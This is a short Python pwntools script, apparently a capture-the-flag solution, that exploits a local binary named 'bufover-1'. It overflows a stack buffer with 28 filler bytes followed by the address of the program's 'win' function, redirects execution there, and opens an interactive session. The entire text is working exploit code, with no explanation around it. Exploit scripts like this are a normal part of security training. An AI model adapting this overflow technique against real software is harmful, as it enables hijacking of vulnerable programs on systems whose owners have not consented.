from pwn import *

e = ELF('./bufover-1')
p = process('./bufover-1')

win_addr = e.symbols['win']

payload = 'A'*28
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
print p.recv()